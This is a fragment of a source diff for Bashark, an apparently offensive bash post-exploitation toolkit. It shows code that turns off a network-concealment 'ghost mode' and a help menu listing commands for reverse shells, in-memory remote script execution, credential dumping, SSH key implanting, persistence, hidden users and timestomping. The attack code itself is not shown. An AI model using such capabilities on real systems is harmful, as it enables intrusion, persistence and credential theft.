+			if [ ! $(which ethtool) ] && [ ! -f /etc/udev/rules.d/70-persistent-net.rules ]
+			then
+				ORGMAC=$( cat $TMPMAC )
+			else
+				if [[ $(which ethtool) ]]
+				then
+					ORGMAC=$(ethtool -P $INTERFACE)
+					ORGMAC=${ORGMAC#*:}
+				else
+					ORGMAC=$(cat /etc/udev/rules.d/70-persistent-net.rules | grep $INTERFACE | cut -d '"' -f 8)
+				fi
+			fi
+			print_info 'Reinitializing MAC address ...'
+			echo
+			/etc/init.d/network-manager stop &>/dev/null
+			if [[ $CMD =~ .*ifconfig ]]; then
+				$CMD $INTERFACE down 
+				$CMD $INTERFACE hw ether $ORGMAC
+			else
+				$CMD link set $INTERFACE down
+				$CMD link set dev $INTERFACE address $ORGMAC
+			fi
+			if [[ $? -ne 0 ]]
+			then
+				print_error "Wrong interface"
+				exit 3
+			fi
+			print_info 'Reconfiguring kernel to normal ARP/NDP linking network mode ...'
+			sysctl net.ipv4.conf.$INTERFACE.arp_ignore=0 > /dev/null
+			sysctl net.ipv4.conf.$INTERFACE.arp_announce=0 > /dev/null
+			ip6tables -D INPUT -i $INTERFACE --protocol icmpv6 --icmpv6-type echo-request -j DROP
+			ip6tables -D INPUT -i $INTERFACE --protocol icmpv6 --icmpv6-type neighbor-solicit -j DROP
+			print_info 'Restoring hostname ...'
+			xauth remove $(hostname)/$(xauth list | cut -d '/' -f 2 | tail -n 1) 2>/dev/null
+			chown $(echo $XAUTHORITY | cut -d '/' -f 3): $XAUTHORITY 2>/dev/null
+			hostnamectl set-hostname $(cat $ORGHOST)
+			print_info 'Reinitializing network interface ...'
+			print_info 'If not connected or taking too long - reconnect manually'
+			if [[ $CMD =~ .*ifconfig ]]; then
+				$CMD $INTERFACE up
+			else
+				$CMD link set $INTERFACE up
+			fi
+				/etc/init.d/network-manager start &>/dev/null
+			print_question 'Perform DHCP (unless you want to specify your own IP)? (y/n)'
+			read dhcp
+			dhcp=${dhcp,,*}
+			dhcp=${dhcp::1}
+			if [[ "$dhcp" = "y" ]]
+			then
+				dhclient $INTERFACE &> /dev/null
+			fi
+			sleep 2
+			/etc/init.d/network-manager restart &>/dev/null
+			rm -f $TMPMAC
+			print_good "{magenta}Ghost mode disabled{reset}"
+		fi
+	fi
+fi
+}
+
 ##Help command
+#Finish and add mod command
 help(){
         echo "
-Bashark ver. 1.0 Commands: 
+Bashark ver. 2.0 Commands: 
 
         (${green}no root required${reset}):
         ${bold}_${reset}${green}            -> ${reset}Go back to previous directory
@@ -1129,31 +1776,39 @@ Bashark ver. 1.0 Commands:
         ${bold}fileinfo${reset}${green}     -> ${reset}Inspect a file
         ${bold}getapp${reset}${green}       -> ${reset}Enumerate installed applications
         ${bold}getconf${reset}${green}      -> ${reset}Enumerate configuration files
+        ${bold}getdbus${reset}${green}      -> ${reset}List all available Dbus services
+        ${bold}getidle${reset}${green}      -> ${reset}List active PTYs and their idle time
         ${bold}getperm${reset}${green}      -> ${reset}Show files and folders with special permissions
+        ${bold}getsec${reset}${green}       -> ${reset}Search for dereferences and presence of three most popular mac programs 
         ${bold}help${reset}${green}         -> ${reset}Show this help message
         ${bold}hosts${reset}${green}        -> ${reset}Enumerate active hosts in background
-        ${bold}i${reset}${green}            -> ${reset}Show information about host
-        ${bold}isvm${reset}${green}         -> ${reset}Check if OS is running on virtual machine
-        ${bold}jshell${reset}${green}       -> ${reset}Establish a reverse Javascript shell
+        ${bold}keyinstall${reset}${green}   -> ${reset}Add a RSA key to list of authorized SSH keys
+        ${bold}isvm${reset}${green}         -> ${reset}Check if os is running on virtual machine
+        ${bold}jshell${reset}${green}       -> ${reset}Establish a reverse interactive javascript shell
+        ${bold}ldexec${reset}${green}       -> ${reset}Execute a file without permission bit set
         ${bold}lg${reset}${green}           -> ${reset}Search for regular expression in filenames of current directory
         ${bold}mex${reset}${green}          -> ${reset}Make file executable
         ${bold}memexec${reset}${green}      -> ${reset}Download and execute remote bash script in memory
         ${bold}mkd${reset}${green}          -> ${reset}Create a directory
+        ${bold}mod${reset}${green}          -> ${reset}Modify every file in current directory with given extension
         ${bold}portscan${reset}${green}     -> ${reset}Perform a portscan
-        ${bold}quit${reset}${green}         -> ${reset}Exit Bashark
+        ${bold}quit${reset}${green}         -> ${reset}Exit bashark
         ${bold}revshell${reset}${green}     -> ${reset}Spawn a reverse shell
-        ${bold}shellcode${reset}${green}    -> ${reset}Execute shellcode in "\x" escaped form
+        ${bold}revshellgen${reset}${green}  -> ${reset}Generate a reverse shell in different formats
+        ${bold}shellcode${reset}${green}    -> ${reset}Execute shellcode provided in "\x" escaped form
         ${bold}t${reset}${green}            -> ${reset}Create a file
         ${bold}timestomp${reset}${green}    -> ${reset}Change attributes of a file
         ${bold}usrs${reset}${green}         -> ${reset}Show all users on the host
-        ${bold}xml_dos${reset}${green}      -> ${reset}Create a XML or YAML DOS file 
-        ${bold}xxe${reset}${green}          -> ${reset}Generate a XML External Entity Injection file 
+        ${bold}xml_dos${reset}${green}      -> ${reset}Create a xml or yaml dos file 
+        ${bold}xxe${reset}${green}          -> ${reset}Generate a xml external entity injection file 
 
         (${red}root required${reset}):
+        ${bold}linikatz${reset}${red}     -> ${reset}Enumerate plaintext and in-memory credentials
         ${bold}portblock${reset}${red}    -> ${reset}Block all opened ports except whitelisted
         ${bold}persist${reset}${red}      -> ${reset}Set a command to be executed after every boot
         ${bold}rootshell${reset}${red}    -> ${reset}Create a rootshell
-        ${bold}usradd${reset}${red}       -> ${reset}Create a new hidden user (OSX only)
+        ${bold}usradd${reset}${red}       -> ${reset}Create a new hidden user (osx only)
+        ${bold}forward${reset}${red}      -> ${reset}Perform ssh port forwarding
 
         To show additional information about specific command, type '<command> -h'
         "
